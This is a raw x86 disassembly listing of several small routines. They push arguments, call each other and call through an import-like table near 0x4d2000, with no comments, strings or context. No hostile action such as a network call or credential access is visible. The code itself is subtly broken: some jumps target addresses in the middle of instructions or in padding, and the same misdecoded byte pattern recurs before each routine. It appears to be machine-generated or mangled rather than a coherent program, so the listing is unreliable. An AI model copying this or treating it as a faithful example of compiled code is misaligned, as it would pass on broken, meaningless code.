  4d1091:	call   DWORD PTR ds:0x4d2008
  4d1097:	call   edi
  4d1099:	add    BYTE PTR [eax],al
  4d109b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10a1:	sub    esp,0x54
  4d10a4:	lea    ecx,ds:0x4d3010
  4d10aa:	mov    ebx,0xffffffea
  4d10af:	push   ecx
  4d10b0:	push   eax
  4d10b1:	push   DWORD PTR [ecx+0x1fc]
  4d10b7:	push   ebx
  4d10b8:	call   0x4d0e18
  4d10bd:	add    esp,0xc
  4d10c0:	pop    ecx
  4d10c1:	push   ecx
  4d10c2:	mov    edx,0xfffffff4
  4d10c7:	push   edx
  4d10c8:	call   0x4d0af4
  4d10cd:	add    esp,0x4
  4d10d0:	pop    ecx
  4d10d1:	push   ecx
  4d10d2:	push   0x0
  4d10d4:	call   0x4d0bf8
  4d10d9:	add    esp,0x4
  4d10dc:	pop    ecx
  4d10dd:	add    esp,0x54
  4d10e0:	pop    ebp
  4d10e1:	ret    
  4d10e2:	add    BYTE PTR [eax],al
  4d10e4:	pop    edi
  4d10e5:	call   DWORD PTR ds:0x4d2084
  4d10eb:	call   edi
  4d10ed:	add    BYTE PTR [eax],al
  4d10ef:	add    BYTE PTR [edi-0x1],bl
  4d10f2:	adc    eax,0x4d200c
  4d10f7:	call   edi
  4d10f9:	add    BYTE PTR [eax],al
  4d10fb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1101:	sub    esp,0x24
  4d1104:	mov    edi,0x4d3014
  4d1109:	xor    DWORD PTR [edi+0x30],0xffffffd4
  4d110d:	push   edi
  4d110e:	push   DWORD PTR [edi+0x114]
  4d1114:	push   eax
  4d1115:	push   DWORD PTR [edi+0x13c]
  4d111b:	call   0x4d0874
  4d1120:	add    esp,0xc
  4d1123:	pop    edi
  4d1124:	push   edi
  4d1125:	push   0x0
  4d1127:	call   0x4d15bc
  4d112c:	add    esp,0x4
  4d112f:	pop    edi
  4d1130:	push   edi
  4d1131:	push   0x0
  4d1133:	call   0x4d10e4
  4d1138:	add    esp,0x4
  4d113b:	pop    edi
  4d113c:	add    esp,0x24
  4d113f:	pop    ebp
  4d1140:	ret    
  4d1141:	add    BYTE PTR [eax],al
  4d1143:	add    BYTE PTR [edi-0x1],bl
  4d1146:	adc    eax,0x4d2078
  4d114b:	call   edi
  4d114d:	add    BYTE PTR [eax],al
  4d114f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1155:	sub    esp,0x30
  4d1158:	lea    eax,ds:0x4d318c
  4d115e:	adc    ecx,DWORD PTR [eax+0xc]
  4d1161:	push   eax
  4d1162:	push   DWORD PTR [eax+0x19c]
  4d1168:	push   DWORD PTR [eax+0x104]
  4d116e:	push   ebx
  4d116f:	push   edi
  4d1170:	call   0x4d0e70
  4d1175:	add    esp,0x10
  4d1178:	pop    eax
  4d1179:	push   eax
  4d117a:	push   0x0
  4d117c:	call   0x4d0950
  4d1181:	add    esp,0x4
  4d1184:	pop    eax
  4d1185:	push   eax
  4d1186:	mov    eax,0x0
  4d118b:	push   eax
  4d118c:	call   0x4d0850
  4d1191:	add    esp,0x4
  4d1194:	pop    eax
  4d1195:	add    esp,0x30
  4d1198:	pop    ebp
  4d1199:	ret    
  4d119a:	add    BYTE PTR [eax],al
  4d119c:	pop    edi
  4d119d:	call   DWORD PTR ds:0x4d206c
  4d11a3:	call   edi
  4d11a5:	add    BYTE PTR [eax],al
  4d11a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11ad:	sub    esp,0x48
  4d11b0:	lea    ebx,ds:0x4d30c8
  4d11b6:	or     DWORD PTR [ebp-0x2c],eax
  4d11b9:	push   ebx
  4d11ba:	push   eax
  4d11bb:	push   DWORD PTR [ebx+0x44]
  4d11be:	push   edi
  4d11bf:	push   eax
  4d11c0:	call   0x4d1418
  4d11c5:	add    esp,0x10
  4d11c8:	pop    ebx
  4d11c9:	lea    ecx,[ebx-0xc8]
  4d11cf:	push   ecx
  4d11d0:	call   0x4d132c
  4d11d5:	add    esp,0x4
  4d11d8:	test   eax,eax
  4d11da:	jne    0x4d11ca
  4d11dc:	call   0x4d0f24
  4d11e1:	add    esp,0x4
  4d11e4:	add    esp,0x48
  4d11e7:	pop    ebp
  4d11e8:	ret    
  4d11e9:	add    BYTE PTR [eax],al
  4d11eb:	add    BYTE PTR [edi-0x1],bl
  4d11ee:	adc    eax,0x4d2040
  4d11f3:	call   edi
  4d11f5:	add    BYTE PTR [eax],al
  4d11f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11fd:	sub    esp,0x30
  4d1200:	lea    ecx,[edx+0xdc]
  4d1206:	sub    ebx,edi
  4d1208:	push   ecx
  4d1209:	push   0x0
  4d120b:	call   0x4d1090
  4d1210:	add    esp,0x4
  4d1213:	pop    ecx
  4d1214:	push   ecx
  4d1215:	push   eax
  4d1216:	push   ebx
  4d1217:	call   0x4d09a8
  4d121c:	add    esp,0x8
  4d121f:	pop    ecx
  4d1220:	push   ecx
  4d1221:	push   0x0
  4d1223:	call   0x4d1090
  4d1228:	add    esp,0x4
  4d122b:	pop    ecx
  4d122c:	add    esp,0x30
  4d122f:	pop    ebp
  4d1230:	ret    
  4d1231:	add    BYTE PTR [eax],al
  4d1233:	add    BYTE PTR [edi-0x1],bl
  4d1236:	adc    eax,0x4d201c
  4d123b:	call   edi
  4d123d:	add    BYTE PTR [eax],al
  4d123f:	add    BYTE PTR [edi-0x1],bl
  4d1242:	adc    eax,0x4d2030
  4d1247:	call   edi
  4d1249:	add    BYTE PTR [eax],al
  4d124b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1251:	sub    esp,0x60
  4d1254:	mov    esi,0x4d3070
  4d1259:	cmp    esi,0xbed
  4d125f:	je     0x4d124f
  4d1261:	push   esi
  4d1262:	push   DWORD PTR [esi+0x188]
  4d1268:	push   DWORD PTR [esi+0x188]
  4d126e:	push   edx
  4d126f:	push   DWORD PTR [esi+0x1a0]
  4d1275:	call   0x4d14dc
  4d127a:	add    esp,0x10
  4d127d:	pop    esi
  4d127e:	mov    edx,0x0
  4d1283:	push   edx
  4d1284:	call   0x4d1234
  4d1289:	add    esp,0x4
  4d128c:	mov    ebx,0x0
  4d1291:	push   ebx
  4d1292:	call   0x4d1090
  4d1297:	add    esp,0x4
  4d129a:	add    esp,0x60
  4d129d:	pop    ebp
  4d129e:	ret    
  4d129f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12a5:	sub    esp,0x54
  4d12a8:	mov    edi,0x4d31dc
  4d12ad:	mov    DWORD PTR [edi-0x5c],0xffff9bd2
  4d12b4:	push   edi
  4d12b5:	mov    ecx,0x0
  4d12ba:	push   ecx
  4d12bb:	call   0x4d0950
  4d12c0:	add    esp,0x4
  4d12c3:	pop    edi
  4d12c4:	push   edi
  4d12c5:	push   eax
  4d12c6:	push   DWORD PTR [edi+0x88]
  4d12cc:	push   DWORD PTR [edi+0x4]
  4d12cf:	push   eax
  4d12d0:	call   0x4d0b0c
  4d12d5:	add    esp,0x10
  4d12d8:	pop    edi
  4d12d9:	push   edi
  4d12da:	push   0x0
  4d12dc:	call   0x4d119c
  4d12e1:	add    esp,0x4
  4d12e4:	pop    edi
  4d12e5:	add    esp,0x54
  4d12e8:	pop    ebp
  4d12e9:	ret    
  4d12ea:	add    BYTE PTR [eax],al
  4d12ec:	mov    edi,edi
  4d12ee:	push   ebp
  4d12ef:	mov    ebp,esp
  4d12f1:	sub    esp,0x4c
  4d12f4:	lea    edi,ds:0x4d30cc
  4d12fa:	sub    esi,DWORD PTR [ebp-0x48]
  4d12fd:	push   edi
  4d12fe:	push   0x0
  4d1300:	call   0x4d0850
  4d1305:	add    esp,0x4
  4d1308:	pop    edi
  4d1309:	push   edi
  4d130a:	push   ebx
  4d130b:	push   ebx
  4d130c:	call   0x4d0740
  4d1311:	add    esp,0x8
  4d1314:	pop    edi
  4d1315:	push   edi
  4d1316:	mov    edx,0x0
  4d131b:	push   edx
  4d131c:	call   0x4d1234
  4d1321:	add    esp,0x4
  4d1324:	pop    edi
  4d1325:	add    esp,0x4c
  4d1328:	pop    ebp
  4d1329:	ret    
  4d132a:	add    BYTE PTR [eax],al
  4d132c:	pop    edi
  4d132d:	call   DWORD PTR ds:0x4d2048
  4d1333:	call   edi
  4d1335:	add    BYTE PTR [eax],al
  4d1337:	add    BYTE PTR [edi-0x1],bl
  4d133a:	adc    eax,0x4d2094
  4d133f:	call   edi
  4d1341:	add    BYTE PTR [eax],al
  4d1343:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1349:	sub    esp,0x2c
  4d134c:	lea    edi,[edx+0x14]
  4d134f:	sbb    edx,0xffffa1b8
  4d1355:	push   edi
  4d1356:	mov    edx,0x0
  4d135b:	push   edx
  4d135c:	call   0x4d0850
  4d1361:	add    esp,0x4
  4d1364:	pop    edi
  4d1365:	push   edi
  4d1366:	push   esi
  4d1367:	push   eax
  4d1368:	call   0x4d080c
  4d136d:	add    esp,0x8
  4d1370:	pop    edi
  4d1371:	push   edi
  4d1372:	push   0x0
  4d1374:	call   0x4d0bf8
  4d1379:	add    esp,0x4
  4d137c:	pop    edi
  4d137d:	add    esp,0x2c
  4d1380:	pop    ebp
  4d1381:	ret    
  4d1382:	add    BYTE PTR [eax],al
  4d1384:	mov    edi,edi
  4d1386:	push   ebp
  4d1387:	mov    ebp,esp
  4d1389:	sub    esp,0x38
  4d138c:	lea    esi,[edx-0x28]
  4d138f:	mov    ecx,DWORD PTR [ebp-0x1c]
  4d1392:	push   esi
  4d1393:	push   edi
  4d1394:	push   DWORD PTR [esi+0x20]
  4d1397:	push   DWORD PTR [esi]
  4d1399:	push   DWORD PTR [esi+0x2c]
  4d139c:	call   0x4d1574
  4d13a1:	add    esp,0x10
  4d13a4:	pop    esi
  4d13a5:	push   0x0
  4d13a7:	call   0x4d1234
  4d13ac:	add    esp,0x4
  4d13af:	call   0x4d1240
  4d13b4:	add    esp,0x4
  4d13b7:	add    esp,0x38
  4d13ba:	pop    ebp
  4d13bb:	ret    
  4d13bc:	mov    edi,edi
  4d13be:	push   ebp
  4d13bf:	mov    ebp,esp
  4d13c1:	sub    esp,0x28
  4d13c4:	lea    ecx,ds:0x4d316c
  4d13ca:	adc    DWORD PTR [ecx-0x60],ebx
  4d13cd:	push   ecx
  4d13ce:	push   DWORD PTR [ecx+0xb4]
  4d13d4:	push   edx
  4d13d5:	push   DWORD PTR [ecx+0x1e0]
  4d13db:	call   0x4d0a00
  4d13e0:	add    esp,0xc
  4d13e3:	pop    ecx
  4d13e4:	push   ecx
  4d13e5:	mov    ebx,0x0
  4d13ea:	push   ebx
  4d13eb:	call   0x4d1234
  4d13f0:	add    esp,0x4
  4d13f3:	pop    ecx
  4d13f4:	push   ecx
  4d13f5:	mov    edx,0x0
  4d13fa:	push   edx
  4d13fb:	call   0x4d0850
  4d1400:	add    esp,0x4
  4d1403:	pop    ecx
  4d1404:	add    esp,0x28
  4d1407:	pop    ebp
  4d1408:	ret    
  4d1409:	add    BYTE PTR [eax],al
  4d140b:	add    BYTE PTR [edi-0x1],bl
  4d140e:	adc    eax,0x4d2080
  4d1413:	call   edi
  4d1415:	add    BYTE PTR [eax],al
  4d1417:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d141d:	sub    esp,0x54
  4d1420:	lea    edi,[ebx-0x4c]
  4d1423:	sbb    DWORD PTR [ebp-0x44],0xffffc327
  4d142a:	push   edi
  4d142b:	push   ecx
  4d142c:	push   DWORD PTR [edi+0x124]
  4d1432:	call   0x4d0f70
  4d1437:	add    esp,0x8
  4d143a:	pop    edi
  4d143b:	push   edi
  4d143c:	mov    esi,0x0
  4d1441:	push   esi
  4d1442:	call   0x4d1234
  4d1447:	add    esp,0x4
  4d144a:	pop    edi
  4d144b:	push   edi
  4d144c:	call   0x4d0734
  4d1451:	add    esp,0x4
  4d1454:	pop    edi
  4d1455:	add    esp,0x54
  4d1458:	pop    ebp
  4d1459:	ret    
  4d145a:	add    BYTE PTR [eax],al
  4d145c:	pop    edi
  4d145d:	call   DWORD PTR ds:0x4d207c
  4d1463:	call   edi
  4d1465:	add    BYTE PTR [eax],al
  4d1467:	add    BYTE PTR [edi-0x1],bl
  4d146a:	adc    eax,0x4d2024
  4d146f:	call   edi
  4d1471:	add    BYTE PTR [eax],al
  4d1473:	add    BYTE PTR [edi-0x1],bl
  4d1476:	adc    eax,0x4d2074
  4d147b:	call   edi
  4d147d:	add    BYTE PTR [eax],al
  4d147f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1485:	sub    esp,0x40
  4d1488:	lea    esi,ds:0x4d30a4
  4d148e:	sbb    DWORD PTR [esi+0x70],0xffffffaa
  4d1492:	call   0x4d1240
  4d1497:	add    esp,0x4
  4d149a:	push   esi
  4d149b:	push   edi
  4d149c:	push   edi
  4d149d:	push   edi
  4d149e:	push   eax
  4d149f:	call   0x4d06ec
  4d14a4:	add    esp,0x10
  4d14a7:	pop    esi
  4d14a8:	push   0x0
  4d14aa:	call   0x4d10f0
  4d14af:	add    esp,0x4
  4d14b2:	add    esp,0x40
  4d14b5:	pop    ebp
  4d14b6:	ret    
  4d14b7:	add    BYTE PTR [edi-0x1],bl
  4d14ba:	adc    eax,0x4d2060
  4d14bf:	call   edi
  4d14c1:	add    BYTE PTR [eax],al
  4d14c3:	add    BYTE PTR [edi-0x1],bl
  4d14c6:	adc    eax,0x4d2018
  4d14cb:	call   edi
  4d14cd:	add    BYTE PTR [eax],al
  4d14cf:	add    BYTE PTR [edi-0x1],bl
  4d14d2:	adc    eax,0x4d2054
  4d14d7:	call   edi
  4d14d9:	add    BYTE PTR [eax],al
  4d14db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14e1:	sub    esp,0x58
  4d14e4:	mov    edi,0x4d3104
  4d14e9:	xor    ebx,ecx
  4d14eb:	push   edi
  4d14ec:	push   DWORD PTR [edi+0xac]
  4d14f2:	push   eax
  4d14f3:	push   DWORD PTR [edi+0x114]
  4d14f9:	call   0x4d109c
  4d14fe:	add    esp,0xc
  4d1501:	pop    edi
  4d1502:	push   edi
  4d1503:	call   0x4d0734
  4d1508:	add    esp,0x4
  4d150b:	pop    edi
  4d150c:	push   edi
  4d150d:	push   0x0
  4d150f:	call   0x4d0bf8
  4d1514:	add    esp,0x4
  4d1517:	pop    edi
  4d1518:	add    esp,0x58
  4d151b:	pop    ebp
  4d151c:	ret    
  4d151d:	add    BYTE PTR [eax],al
  4d151f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1525:	sub    esp,0x2c
  4d1528:	lea    edi,ds:0x4d3180
  4d152e:	cmp    edi,0x2e89
  4d1534:	je     0x4d1523
  4d1536:	push   edi
  4d1537:	push   DWORD PTR [edi+0xdc]
  4d153d:	push   edx
  4d153e:	push   ebx
  4d153f:	push   DWORD PTR [edi+0x1ac]
  4d1545:	call   0x4d0780
  4d154a:	add    esp,0x10
  4d154d:	pop    edi
  4d154e:	push   edi
  4d154f:	mov    edx,0xfffffff4
  4d1554:	push   edx
  4d1555:	call   0x4d0af4
  4d155a:	add    esp,0x4
  4d155d:	pop    edi
  4d155e:	push   edi
  4d155f:	mov    ecx,0x0
  4d1564:	push   ecx
  4d1565:	call   0x4d10e4
  4d156a:	add    esp,0x4
  4d156d:	pop    edi
  4d156e:	add    esp,0x2c
  4d1571:	pop    ebp
  4d1572:	ret    
  4d1573:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1579:	sub    esp,0x60
  4d157c:	mov    edi,0x4d31a0
  4d1581:	add    ebx,0xffffffa1
  4d1584:	push   edi
  4d1585:	push   DWORD PTR [edi+0x100]
  4d158b:	push   ebx
  4d158c:	call   0x4d13bc
  4d1591:	add    esp,0x8
  4d1594:	pop    edi
  4d1595:	push   edi
  4d1596:	mov    edi,0xfffffff4
  4d159b:	push   edi
  4d159c:	call   0x4d0af4
  4d15a1:	add    esp,0x4
  4d15a4:	pop    edi
  4d15a5:	push   edi
  4d15a6:	mov    edx,0x0
  4d15ab:	push   edx
  4d15ac:	call   0x4d15bc
  4d15b1:	add    esp,0x4
  4d15b4:	pop    edi
  4d15b5:	add    esp,0x60
  4d15b8:	pop    ebp
  4d15b9:	ret    
  4d15ba:	add    BYTE PTR [eax],al
  4d15bc:	pop    edi
  4d15bd:	call   DWORD PTR ds:0x4d2034
  4d15c3:	call   edi
  4d15c5:	add    BYTE PTR [eax],al
	...
